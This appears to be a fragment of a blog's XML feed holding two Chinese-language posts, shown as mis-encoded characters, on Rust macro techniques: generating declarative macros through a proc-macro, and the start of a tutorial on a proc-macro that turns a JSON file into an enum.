        <content type="html"><![CDATA[<h1 id="Rustå®é­”æ³•â€”â€”ç¬¬äºŒè¾‘ï¼ˆ"><a href="#Rustå®é­”æ³•â€”â€”ç¬¬äºŒè¾‘ï¼ˆ" class="headerlink" title="Rustå®é­”æ³•â€”â€”ç¬¬äºŒè¾‘ï¼ˆ"></a>Rustå®é­”æ³•â€”â€”ç¬¬äºŒè¾‘ï¼ˆ</h1><blockquote><p>  åˆæ¥æ•´ç‚¹å¥‡æŠ€æ·«å·§äº†</p></blockquote><p>è¿™æœŸå°±ç©ç©ç”¨å£°æ˜å®æ¥ç”Ÿæˆå®ï¼ˆ</p><p>æ€»ç»“å¯ä»¥ç›´æ¥çœ‹ ğŸ‘‰ <a href="#%E7%9C%81%E6%B5%81">çœæµ</a></p><p>å‡è®¾æœ‰ä»¥ä¸‹çš„å¥‡æ€ªæƒ…æ™¯ï¼š</p><blockquote><p>  ä½ æ•´äº†ä¸€ä¸ªæ—¥å¿—ç³»ç»Ÿï¼Œä½†æ˜¯å…¶ä¸­çš„è¾“å‡ºå†…å®¹æ˜¯é¢„è®¾å¥½çš„ï¼ˆå½“ç„¶ä¹Ÿåº”è¯¥é¢„ç•™ä¸€ä¸ªæ¯”å¦‚ Other çš„æ¥è‡ªå®šä¹‰å†…å®¹ï¼‰</p><p>  ç„¶åä½ æƒ³è¦ç»™æ¯ä¸€ç§è¾“å‡ºå†…å®¹éƒ½æ³¨å†Œä¸€ä¸ªå®ï¼Œå¹¶ä¸”æœ‰äº›è¾“å‡ºæ˜¯å¸¦æœ‰ â€œ{}â€ çš„ï¼Œå› æ­¤ä½ å¸Œæœ›èƒ½å¤Ÿæœ‰ç±»ä¼¼ä¸‹é¢è¿™ä¸ªæ•ˆæœï¼š</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app_start_failed!(e)</span><br><span class="line"><span class="comment">// App start failed due to the error : &#123;e&#125;</span></span><br></pre></td></tr></table></figure><p>  ä¹Ÿå°±æ˜¯åƒ <code>println!</code> ä¹‹ç±»çš„å®èƒ½å¤Ÿæ¥å—ä¸å®šæ•°é‡çš„å‚æ•°ï¼Œå…·ä½“çœ‹æ ¼å¼ï¼ˆä¹Ÿå°±æ˜¯ä½ é¢„è®¾å­—ç¬¦ä¸²é‡Œé¢æœ‰å‡ ä¸ª â€œ{}â€ )</p></blockquote><span id="more"></span><p>ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œå°±ä»¥ä»¥ä¸‹ä½œä¸ºä¾‹å­å§</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app_started : <span class="string">&quot;App start!&quot;</span></span><br><span class="line">app_start_failed : <span class="string">&quot;App start failed due to the error: &#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœåªæ˜¯è€ƒè™‘ä¸Šé¢è¿™ç§ï¼Œåº”è¯¥å¾ˆå®¹æ˜“å†™æˆè¿™æ ·ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> generate_macros &#123;</span><br><span class="line">    ( $( $id:ident =&gt; $e:expr ),*$(,)? ) =&gt; &#123;</span><br><span class="line">        $(</span><br><span class="line">            <span class="meta">#[macro_export]</span></span><br><span class="line">            <span class="built_in">macro_rules!</span> $id &#123;</span><br><span class="line">                () =&gt; &#123;</span><br><span class="line">                    <span class="built_in">println!</span>($e);</span><br><span class="line">    &#125;;</span><br><span class="line">                ($tt:tt) =&gt; &#123;</span><br><span class="line">                    <span class="built_in">println!</span>($e, $tt);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        )*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">generate_macros! &#123;</span><br><span class="line">    app_started =&gt; <span class="string">&quot;App start!&quot;</span>,</span><br><span class="line">    app_start_failed =&gt; <span class="string">&quot;App start failed due to the error: &#123;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    app_started!();</span><br><span class="line">    app_start_failed!(<span class="string">&quot;AAAAAAA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·è‡ªç„¶èƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ä¹Ÿä¸éš¾å‘ç°é—®é¢˜ï¼Œå°±æ˜¯å¦‚æœå¢åŠ äº†ä¸€ä¸ªæœ‰ä¸¤ä¸ª â€œ{}â€ çš„å­—æ®µï¼Œé‚£å°±ä¸å¾—ä¸ç»™ generate_macros é‡Œé¢æ–°å¢ä¸€ä¸ªè§„åˆ™ã€‚</p><p>å½“ç„¶ï¼Œå¯¹äº macro çƒ‚ç†Ÿäºå¿ƒçš„ä½ ï¼Œè‚¯å®šæƒ³åˆ°å¯ä»¥æŠŠè¿™ä¸ªé‡Œé¢çš„åŒ¹é…æ¨¡å¼ç»Ÿä¸€æˆ  <code>$($tt:tt)*</code> ï¼Œä¹Ÿå°±æ˜¯ç±»ä¼¼ä¸‹é¢è¿™ç§ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> generate_macros &#123;</span><br><span class="line">    ( $( $id:ident =&gt; $e:expr ),*$(,)? ) =&gt; &#123;</span><br><span class="line">        $(</span><br><span class="line">            <span class="meta">#[macro_export]</span></span><br><span class="line">            <span class="built_in">macro_rules!</span> $id &#123;</span><br><span class="line">                ($($tt:tt)*) =&gt; &#123;</span><br><span class="line">                    <span class="built_in">println!</span>($e, $tt);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        )*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è‡ªä¿¡è¿è¡Œï¼</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">error: attempted to repeat an expression containing no syntax variables matched as repeating at this depth</span><br><span class="line"> <span class="literal">--</span>&gt; src/main.rs:<span class="number">9</span>:<span class="number">19</span></span><br><span class="line">  |</span><br><span class="line"><span class="number">9</span> |                 (<span class="variable">$</span>(<span class="variable">$tt:tt</span>)*) =&gt; &#123;</span><br><span class="line">  |                   ^^^^^^^</span><br></pre></td></tr></table></figure><p>æŠ¥é”™äº†ï¼Œæ‚²ï¼ˆ</p><p>è¿™ä¸ªåŸå› ä¸»è¦æ˜¯åƒ <code>$( #[macro_export] xxxxx )*</code> è¿™æ ·ï¼Œè¢«é€’å½’å±•å¼€äº†ï¼Œä½†æ˜¯åœ¨ <code>macro_rules! $id &#123;&#125;</code> ä¸­è¿™ä¹ˆå†™ï¼Œå°±ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™ç»“æŸï¼Œå› ä¸º <code>$tt</code> ä¹Ÿæ˜¯æ²¡æœ‰åœ¨ <code>macro_rules! generate_macros</code> ä¸­å£°æ˜ï¼ˆ</p><p>ä½†æ˜¯è¿™é‡Œå¦‚æœæ˜¯é€šè¿‡ <code>proc-macro</code> åŒ…ä¸Šä¸€å±‚å°±å¯ä»¥æ­£ç¡®è§£æäº†</p><p>æ–°å»ºä¸€ä¸ª <code>proc-macro</code> ç±»å‹çš„crateï¼Œå†™ä¸Šä»¥ä¸‹ä»£ç </p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> proc_macro;</span><br><span class="line"><span class="keyword">use</span> proc_macro::TokenStream;</span><br><span class="line"><span class="keyword">use</span> quote::quote;</span><br><span class="line"><span class="keyword">use</span> syn::&#123;parse_macro_input, parse::&#123;Parse, ParseBuffer&#125;, Token, Ident, LitStr&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MacroInfo</span> &#123;</span><br><span class="line">    id: Ident,</span><br><span class="line">    msg: LitStr,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Parse</span> <span class="keyword">for</span> <span class="title class_">MacroInfo</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">parse</span>(input: &amp;ParseBuffer) <span class="punctuation">-&gt;</span> syn::<span class="type">Result</span>&lt;<span class="keyword">Self</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">id</span> = input.parse::&lt;Ident&gt;()?;</span><br><span class="line">        input.parse::&lt;Token![=&gt;]&gt;()?;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">msg</span> = input.parse::&lt;LitStr&gt;()?;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="keyword">Self</span> &#123; id, msg &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[proc_macro]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">make_macro</span>(input: TokenStream) <span class="punctuation">-&gt;</span> TokenStream &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = parse_macro_input!(input <span class="keyword">as</span> MacroInfo);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">id</span> = &amp;input.id;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">msg</span> = &amp;input.msg;</span><br><span class="line">    </span><br><span class="line">    quote! &#123;</span><br><span class="line">        <span class="built_in">macro_rules!</span> #id &#123;</span><br><span class="line">            ($($tt:tt)*) =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(#msg, $($tt)*);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.<span class="title function_ invoke__">into</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶å <code>generate_macros</code> è¿™è¾¹æ›¿æ¢ä¸€ä¸‹å°±å¥½äº†</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> generate_macros &#123;</span><br><span class="line">    ( $( $id:ident =&gt; $e:expr ),*$(,)? ) =&gt; &#123;</span><br><span class="line">        $(</span><br><span class="line">            make_macro! &#123;</span><br><span class="line">                $id =&gt; $e</span><br><span class="line">            &#125;</span><br><span class="line">        )*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºèŒƒï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">generate_macros! &#123;</span><br><span class="line">    hello =&gt; <span class="string">&quot;Hello, &#123;&#125;!&quot;</span>,</span><br><span class="line">    goodbye =&gt; <span class="string">&quot;Goodbye, &#123;&#125;!&quot;</span>,</span><br><span class="line">    hhh =&gt; <span class="string">&quot;hhh, &#123;&#125; and &#123;&#125;!&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    hello!(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    goodbye!(<span class="string">&quot;world&quot;</span>); </span><br><span class="line">    hhh!(<span class="string">&quot;world&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ï¼Œå†™ä»»æ„æ ¼å¼çš„å­—ç¬¦ä¸²å°±ä¸éœ€è¦åœ¨ generate_macros é‚£é‡Œæ·»åŠ æ–°çš„åŒ¹é…æ¨¡å¼äº†ã€‚</p><h2 id="çœæµ"><a href="#çœæµ" class="headerlink" title="çœæµ"></a>çœæµ</h2><p>ä¸ºäº†é¿å…åœ¨ macro_rules ä¸­å®šä¹‰ macro_rules æ—¶é”™è¯¯çš„è§£æå†…å±‚å£°æ˜å®çš„ <code>$( xxx )*</code> è¿™ä¸€ç±»æ¨¡å¼ï¼Œéœ€è¦æŠŠè¿™éƒ¨åˆ†ç§»åŠ¨åˆ° <code>proc-macro</code> ä¸­ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rustå®é­”æ³•(1)</title>
      <link href="/rust%E5%AE%8F%E9%AD%94%E6%B3%95-1/"/>
      <url>/rust%E5%AE%8F%E9%AD%94%E6%B3%95-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Rustå®é­”æ³•â€”â€”ç¬¬ä¸€è¾‘ï¼ˆä¸çŸ¥é“åé¢è¿˜ä¼šä¸ä¼šæ›´æ–°ï¼Œæ€»ä¹‹è¿™æ˜¯ä¸ªç³»åˆ—ï¼‰"><a href="#Rustå®é­”æ³•â€”â€”ç¬¬ä¸€è¾‘ï¼ˆä¸çŸ¥é“åé¢è¿˜ä¼šä¸ä¼šæ›´æ–°ï¼Œæ€»ä¹‹è¿™æ˜¯ä¸ªç³»åˆ—ï¼‰" class="headerlink" title="Rustå®é­”æ³•â€”â€”ç¬¬ä¸€è¾‘ï¼ˆä¸çŸ¥é“åé¢è¿˜ä¼šä¸ä¼šæ›´æ–°ï¼Œæ€»ä¹‹è¿™æ˜¯ä¸ªç³»åˆ—ï¼‰"></a>Rustå®é­”æ³•â€”â€”ç¬¬ä¸€è¾‘ï¼ˆä¸çŸ¥é“åé¢è¿˜ä¼šä¸ä¼šæ›´æ–°ï¼Œæ€»ä¹‹è¿™æ˜¯ä¸ªç³»åˆ—ï¼‰</h1><p><em><strong>æ³¨ï¼šæœ¬æ–‡é»˜è®¤ä½ å·²ç»æœ‰ä¸€å®šçš„RuståŸºç¡€</strong></em></p><p>rustçš„å®çš„å¼ºå¤§ç›¸ä¿¡å¤§å®¶è‚¯å®šå¬çš„ä¸å°‘ï¼Œæœ¬ç¯‡å°±ç®€å•è¯´è¯´rustçš„è¿‡ç¨‹å®</p><p>rustçš„å®æœ‰å¥½å‡ ç§ï¼Œæœ‰åŸºäºæ¨¡å¼åŒ¹é…çš„ï¼Œè¿˜æœ‰å¯ä»¥ç›´æ¥å¯¹è¯­æ³•æ ‘åŠ¨æ‰‹çš„ï¼Œè¿‡ç¨‹å®å°±æ˜¯å¯ä»¥ä¿®æ”¹è¯­æ³•æ ‘ï¼Œå¯ä»¥åœ¨ç¼–è¯‘å™¨æ´¾ç”Ÿä»£ç ï¼šæ¯”å¦‚æœ‰ä¸ªtest crateï¼Œç„¶åå®ƒä¾èµ–äºtest_macro crateï¼Œè€Œåè€…æ˜¯ä¸€ä¸ªproc-macroåº“ï¼Œä¹Ÿå°±æ˜¯é‡Œé¢å®šä¹‰äº†è¿‡ç¨‹å®ï¼Œç¼–è¯‘æ—¶å°±ä¼šå…ˆç¼–è¯‘test_macroç„¶åç”¨test_macroçš„å¯¹testçš„è¯­æ³•è§£ææµä¿®æ”¹å†ä¸¢ç»™ç¼–è¯‘å™¨ï¼Œæ‰€ä»¥å¯ä»¥å®ç°å¾ˆå¤šéå¸¸æŠ½è±¡çš„æ“ä½œã€‚</p><p>å†™æœ¬æ–‡çš„å¥‘æœºæ˜¯ï¼Œå‰æ®µæ—¶é—´åœ¨Rustä¸­æ–‡ç¤¾åŒºç¾¤é‡Œçœ‹åˆ°æœ‰äººé—®èƒ½ä¸èƒ½ç”¨å®æŠŠjsonç”Ÿæˆä¸€ä¸ªenumï¼ˆjsonåªæœ‰ä¸€å±‚ï¼‰ï¼Œè¿™ä¸ªéœ€æ±‚å’Œè¿‡ç¨‹å®è¿˜æ˜¯å¾ˆå¥‘åˆçš„ï¼Œæ‰€ä»¥å°±ç®€å•å®ç°äº†ä¸€ä¸‹ï¼Œä»¥ä¸‹å†…å®¹å°±æ˜¯å¯¹å®ç°çš„è®²è§£</p><span id="more"></span><p>é¦–å…ˆå¼€ä¸ªcrateå§</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo new json_to_enum</span><br></pre></td></tr></table></figure><blockquote><p>  ç›´åˆ°æ’°å†™æœ¬æ–‡æ—¶ï¼Œæƒ³è¦å®šä¹‰è¿‡ç¨‹å®è¿˜æ˜¯å¿…é¡»è¦å•ç‹¬å¼€ä¸ªcrateï¼Œå¹¶ä¸”åœ¨<code>cargo.toml</code>é‡Œé¢è®¾ç½® <code>lib.proc-macro = true</code></p><p>  è‡³äºåŸå› æ˜¯rustçš„ç¼–è¯‘å•å…ƒæ˜¯crateï¼Œè€Œå‰é¢ä¹Ÿè¯´è¦æ‹¿è¿‡ç¨‹å®çš„åº“ç¼–è¯‘å¥½å¯¹å…¶ä»–åº“ä½¿ç”¨çš„ï¼Œæ‰€ä»¥å°±ä¸å¯é¿å…è¦åˆ†å‰²ï¼Œå•ç‹¬å¼€ä¸ªcrateã€‚</p></blockquote><p>ç„¶ååˆ›å»ºè¿‡ç¨‹å®åº“ï¼Œè¿™é‡Œæˆ‘ä¸€èˆ¬å–œæ¬¢æŠŠä¾èµ–çš„å…¶ä»–è‡ªå·±å†™çš„åº“æ”¾åœ¨srcä¸‹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cargo new <span class="literal">--lib</span> json_to_enum_macro</span><br><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ›å»ºä¸€ä¸ªjsonæ–‡ä»¶ç”¨äºæµ‹è¯•ï¼Œå†…å®¹æ¯”å¦‚ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;app_name_not_set&quot;</span><span class="punctuation">:</span> <span class="string">&quot;åº”ç”¨åç§°æœªè®¾ç½®&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;app_name_too_long&quot;</span><span class="punctuation">:</span> <span class="string">&quot;åº”ç”¨åç§°è¿‡é•¿&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;app_name_invalid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;åº”ç”¨åç§°æ— æ•ˆ&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;app_name_already_exists&quot;</span><span class="punctuation">:</span> <span class="string">&quot;åº”ç”¨åç§°å·²å­˜åœ¨&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨çš„æ–‡ä»¶ç»“æ„åº”è¯¥æ˜¯ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€src</span><br><span class="line">â”‚  â”œâ”€main.rs</span><br><span class="line">â”‚  â””â”€json_to_enum_macro</span><br><span class="line">â”‚      â””â”€src</span><br><span class="line">â”‚   â””â”€lib.rs</span><br><span class="line">â””â”€test.json</span><br></pre></td></tr></table></figure><p>emmï¼Œå…ˆå±•ç¤ºä¸€ä¸‹è°ƒç”¨çš„æ•ˆæœå§</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> json_to_enum_macro::json_to_enum;</span><br><span class="line"></span><br><span class="line">json_to_enum! &#123;</span><br><span class="line">    <span class="meta">#[from_json(<span class="string">&quot;test.json&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Test</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">4</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">t</span> = <span class="keyword">unsafe</span> &#123; std::mem::transmute::&lt;<span class="type">u8</span>, Test&gt;(i) &#125;;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125; &#123;&#125;&quot;</span>, t, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">AppNameAlreadyExists &quot;åº”ç”¨åç§°å·²å­˜åœ¨&quot;</span></span><br><span class="line"><span class="comment">AppNameInvalid &quot;åº”ç”¨åç§°æ— æ•ˆ&quot;</span></span><br><span class="line"><span class="comment">AppNameNotSet &quot;åº”ç”¨åç§°æœªè®¾ç½®&quot;</span></span><br><span class="line"><span class="comment">AppNameTooLong &quot;åº”ç”¨åç§°è¿‡é•¿&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><code>json_to_enum</code>å®é‡Œé¢çš„åŒ¹é…è§„åˆ™æ˜¯ä¸€çœ‹åˆ°è¿™ä¸ªéœ€æ±‚æ—¶çš„æƒ³æ³•ï¼Œæ‰€ä»¥åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™ï¼ˆï¼‰</p><p>é‡Œé¢å¡ä¸€ä¸ªç©ºçš„enumä¹Ÿæ˜¯æ–¹ä¾¿æŒ‡å®šè¿™ä¸ªè§£æå‡ºçš„enumçš„åå­—è€Œå·²ï¼Œæœ€ç»ˆçš„æ•ˆæœæ˜¯ä¼šæ›¿æ¢æ‰enumçš„å†…å®¹ï¼Œæ‰€ä»¥é‡Œé¢å†™ä»€ä¹ˆå†…å®¹éƒ½æ²¡æœ‰ç”¨</p><p>å¥½äº†ï¼Œç°åœ¨å¼€å§‹æ­£å¼ç¼–å†™ï¼</p><h2 id="å¼€å§‹ç¼–å†™ä½ çš„proc-macro"><a href="#å¼€å§‹ç¼–å†™ä½ çš„proc-macro" class="headerlink" title="å¼€å§‹ç¼–å†™ä½ çš„proc-macro"></a>å¼€å§‹ç¼–å†™ä½ çš„proc-macro</h2><p>å…ˆåœ¨json_to_enum_macroçš„<code>cargo.toml</code>é‡Œé¢è®¾ç½® <code>lib.proc-macro = true</code></p><p>ç„¶åå¯¼å…¥proc-macroçš„ä¾èµ– quoteï¼Œsynï¼Œä»¥åŠç”¨äºè§£æjsonæ–‡ä»¶çš„serde_jsonåº“</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo add quote syn serde_json</span><br></pre></td></tr></table></figure><p>ç°åœ¨æ–‡ä»¶åº”è¯¥æ˜¯è¿™æ ·</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;json_to_enum_macro&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[lib]</span></span><br><span class="line"><span class="attr">proc-macro</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">quote</span> = <span class="string">&quot;1.0.36&quot;</span></span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0.116&quot;</span></span><br><span class="line"><span class="attr">syn</span> = <span class="string">&quot;2.0.59&quot;</span></span><br></pre></td></tr></table></figure><p>æŠŠè¿™ä¸ªåº“æ·»åŠ åˆ°json_to_enumçš„ä¾èµ–</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[workspace]</span></span><br><span class="line"><span class="attr">members</span> = [</span><br><span class="line">    <span class="string">&quot;src/json_to_enum_macro&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;json_to_enum&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies.json_to_enum_macro]</span></span><br><span class="line"><span class="attr">path</span> = <span class="string">&quot;src/json_to_enum_macro&quot;</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥rust-analyserå°±ä¼šä¸€èµ·è§£æä½ çš„macroåº“äº†</p><p>æ‰“å¼€<code>lib.rs</code>æ–‡ä»¶å¯¼å…¥ä¾èµ–</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> proc_macro;</span><br><span class="line"><span class="keyword">use</span> proc_macro::&#123;Span, TokenStream&#125;;</span><br><span class="line"><span class="keyword">use</span> quote::quote;</span><br><span class="line"><span class="keyword">use</span> syn::&#123;parse_macro_input, DeriveInput, Ident, Lit&#125;;</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æ¥è¯´åŸºæœ¬éƒ½ä¼šç”¨ä¸Šè¿™å‡ ä¸ªï¼š<code>proc_macro::TokenStream, quote::quote, syn::&#123;parse_macro_input, DeriveInput&#125;</code></p><p>proc macroä¹Ÿæœ‰å¥½å‡ ç§ï¼Œæ¯”å¦‚ <code>proc_macro_derive</code> 